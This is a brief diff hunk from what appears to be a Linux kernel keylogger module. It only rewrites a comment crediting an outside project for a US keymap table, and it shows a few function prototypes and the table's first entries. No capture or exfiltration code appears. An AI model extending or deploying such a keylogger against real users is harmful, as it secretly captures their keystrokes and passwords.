@@ -48,7 +48,10 @@ static void write_log_task(struct work_struct *work);
 static size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size);
 static void flush_buffer(struct keyboard_logger *klogger);
 
-// US keymap
+/* 
+ * US keymap
+ * I got this from: https://github.com/jarun/spy/blob/master/spy.c
+ */
 static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
